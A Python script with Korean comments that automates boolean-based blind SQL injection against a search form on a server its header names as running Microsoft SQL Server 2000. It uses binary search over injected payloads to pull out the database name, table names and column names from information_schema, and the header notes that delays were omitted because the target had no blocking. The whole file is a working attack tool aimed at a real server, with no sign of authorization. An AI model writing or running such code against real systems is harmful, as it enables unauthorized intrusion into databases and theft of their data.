"""
위 코드는 Microsoft SQL Server 2000 - 8.00.194버전을 운영중인 특정 서버를 대상으로 진행한 Blind Injection 자동화 코드다.
Injection 취약점이 발생하는 지점을 확인해 공격포인트에 맞춰 소스를 제작했다.
서버의 트래픽 수용치가 높고 차단 정책이 없어 별도의 딜레이 기능을 포함하지 않았다.
제작기간: 2일


전체적인 소스의 실행 흐름은 다음과 같다.
<DB 검색 시>
DB_Search-> { Data_Search(이진 탐색) <-> Request(페이로드전송) //반복 후 반환 }

<테이블 검색 시>
Table_Search(테이블 검색)-> { Data_Search(이진 탐색) <-> Request(페이로드전송) //반복 후 반환 }

<열 검색 시>
Column_Search(열 검색)-> { Data_Search(이진 탐색) <-> Request(페이로드전송) //반복 후 반환 }
"""
from bs4 import BeautifulSoup  # pip install beautifulsoup4
import requests


# 공격을 실행한 서버
url = 'url'


# 전송클래스, send메소드는 페이로드를 받아 서버로 전송하여 참, 거짓을 판별 하여 반환한다.
# 특정 서버를 대상으로 진행했기 때문에 SQL 인젝션 취약점이 존재하는 페이지의 POST요청 형식에 맞췄다.
class Request:
    def send(self, payload):

        params = {'k': 'title', 'w': payload}
        response = requests.post(url, data=params)
        bsStr = BeautifulSoup(response.content, 'html.parser')

        # 검색결과가 참이면 None 거짓이면 '등록된 게시물이 없습니다.'
        target = bsStr.find('td', attrs={'colspan': '7', 'align': 'center'})
        if target != None:
            return 0  # 실패
        else:
            return 1  # 성공!!!!!!!

# 빠른 블라인드 검색을 위한 이진탐색 알고리즘 적용
# 받아온 페이로드에 비교 연산자를 추가해 Request객체의 send메소드를 호출한 후 전달한다.
# 모든 페이로드에는 이진 탐색 알고리즘을 위해 임의로 지정한 치환 문자 {}를 포함한다.


class Data_Search:
    def binary(self, payload, left, right):
        r = Request()
        if left <= right:
            i = (left + right) // 2

            if(r.send(payload.replace('{}', '>'+str(i)))):
                return self.binary(payload, i+1, right)
            elif(r.send(payload.replace('{}', '<'+str(i)))):
                return self.binary(payload, left, i-1)
            else:
                return i
        return -1

# DB의 정보를 가져오는 클래스
# getLength() : 현재 DB 이름의 길이를 출력한다.
# getName() : 길이를 기반으로 이름을 출력한다.
# getAll() : DB_Search의 메소드 모두 실행


class DB_Search:
    length = 0

    def getLength(self):
        search = Data_Search()
        payload = "' and len(db_name()){}--"
        result = search.binary(payload, 0, 20)  # 이진 탐색의 범위 인자도 함께 넘겨준다.
        if(result == -1):
            print('DB이름이 검색 최대 값을 벗어납니다.')
        else:
            print('DB의 이름 길이 : ' + str(result))
            self.length = result

    def getName(self):
        search = Data_Search()
        result = ""
        if(self.length == 0):
            pass
        else:
            for _ in range(1, self.length+1):
                payload = "' and ASCII(substring(db_name(),"+str(_)+",1)){}--"
                # 이진 탐색의 범위를 특정 ASCII범위로 지정한다.
                tmp = search.binary(payload, 48, 123)
                result += chr(tmp)
            print('DB 이름 : ' + result)
            return result

    def getAll(self):
        self.getLength()
        self.getName()


# 테이블의 정보를 가져오는 클래스
# getCount(DB이름) : 지정한 DB에 있는 테이블의 갯수를 출력하고 count 객체 변수에 저장한다.
# getLength(DB이름) : count값을 기반으로 테이블들의 이름 길이를 출력하고 length 객체 리스트 변수에 저장한다.
# getName(DB이름) : length값을 기반으로 테이블 이름을 출력한다.
# getAll(DB이름) : 위 내용 모두 실행
class Table_Search:
    length = []
    resultAll = []
    count = 0

    def getCount(self):
        search = Data_Search()
        payload = "' and (select COUNT(*) from information_schema.tables where table_type='base table'){}--"
        result = search.binary(payload, 0, 20)
        if(result == -1):
            print('테이블갯수가 검색 최대 값을 벗어납니다.')
        else:
            print('테이블 개수 : ' + str(result))
            self.count = result

    def getCount(self, db_name):
        search = Data_Search()
        payload = "' and (select COUNT(*) from information_schema.tables where table_type='base table' and table_catalog='%s'){}--" % (db_name)
        result = search.binary(payload, 0, 50)
        if(result == -1):
            print('테이블갯수가 검색 최대 값을 벗어납니다.')
        else:
            print(db_name+'의 테이블 개수 : ' + str(result))
            self.count = result

    def getLength(self, db_name):
        self.length = list(range(0, self.count))
        search = Data_Search()
        for _ in range(self.count-1, -1, -1):
            payload = "' and len((select top 1 table_name from (select top %s table_name,table_type from information_schema.tables where table_type='base table' and table_catalog='%s' order by 1 asc) A where A.table_type='base table' order by 1 desc)){}--" % (
                str(_+1), db_name)
            # MSSQL은 MySQL과 다르게 limit을 이용한 행 인덱싱을 할 수 없다. 특히 테이블의 목록을 가져오는 함수를 찾을 수 없었다.
            # 그렇기 때문에 서브쿼리와 정렬, top을 이용해 특정 행을 잘라내는 법을 사용했다.
            self.length[_] = search.binary(payload, 0, 30)
            if(self.length[_] == -1):
                print('테이블이름이 검색 최대 값을 벗어납니다.')
            else:
                print('%d번째 테이블의 이름 길이 : %s' %
                      (self.count-_, str(self.length[_])))

    def getName(self, db_name):
        result = ""
        search = Data_Search()
        for _ in range(self.count-1, -1, -1):
            for index in range(0, self.length[_]):
                payload = "' and ASCII(substring((select top 1 table_name from (select top %s table_name,table_type from information_schema.tables where table_type='base table' and table_catalog='%s' order by 1 asc) A where A.table_type='base table' order by 1 desc),%s,1)){}--" % (
                    str(_+1), db_name, str(index+1))
                tmp = search.binary(payload, 48, 123)
                result += chr(tmp)
            print('%d번째 테이블의 이름 : %s' % (self.count-_, result))
            self.resultAll.append(result)
            result = ""
        print(self.resultAll)

    def getAll(self, db_name):
        self.getCount(db_name)
        self.getLength(db_name)
        self.getName(db_name)

# 특정 테이블의 열 정보를 가져오는 클래스
# getCount(DB이름, 테이블이름) : 지정한 테이블에 있는 열의 갯수를 출력하고 count 객체 변수에 저장한다.
# getLength(DB이름, 테이블이름) : count값을 기반으로 열들의 이름 길이를 출력하고 length 객체 리스트 변수에 저장한다.
# getName(DB이름, 테이블이름) : length값을 기반으로 열 이름을 출력한다.
# getAll(DB이름, 테이블이름) : 위 내용 모두 실행


class Column_Search:
    length = []
    resultAll = []
    count = 0

    def getCount(self, db_name, table_name):
        search = Data_Search()
        payload = "' and (select COUNT(*) from information_schema.columns where table_catalog='%s' and table_name='%s'){}--" % (db_name, table_name)
        result = search.binary(payload, 0, 50)
        if(result == -1):
            print('열 갯수가 검색 최대 값을 벗어납니다.')
        else:
            print(table_name+'의 열(Column) 개수 : ' + str(result))
            self.count = result

    def getLength(self, db_name, table_name):
        self.length = list(range(0, self.count+1))
        search = Data_Search()
        for _ in range(1, self.count+1):
            payload = "' and len(col_name(object_id('%s.dbo.%s'),%s)){}--" % (
                db_name, table_name, str(_))
            self.length[_] = search.binary(payload, 0, 30)
            if(self.length[_] == -1):
                print('열 이름이 검색 최대 값을 벗어납니다.')
            else:
                print('%d번째 열의 이름 길이 : %d' % (_, self.length[_]))

    def getName(self, db_name, table_name):
        result = ""
        search = Data_Search()
        for _ in range(1, self.count+1):
            for index in range(0, self.length[_]):
                payload = "' and ASCII(substring(col_name(object_id('%s.dbo.%s'),%s),%s,1)){}--" % (
                    db_name, table_name, str(_), str(index+1))
                tmp = search.binary(payload, 48, 123)
                result += chr(tmp)
            print('%d번째 열의 이름 : %s' % (_, result))
            self.resultAll.append(result)
            result = ""
        print(self.resultAll)

    def getAll(self, db_name, table_name):
        self.getCount(db_name, table_name)
        self.getLength(db_name, table_name)
        self.getName(db_name, table_name)


if __name__ == "__main__":
    db_name = 'database'
    table_name = 'table'

    #db = DB_Search()
    #table = Table_Search()
    col = Column_Search()
    # db.getAll()
    # table.getAll(db_name)
    col.getAll(db_name, table_name)
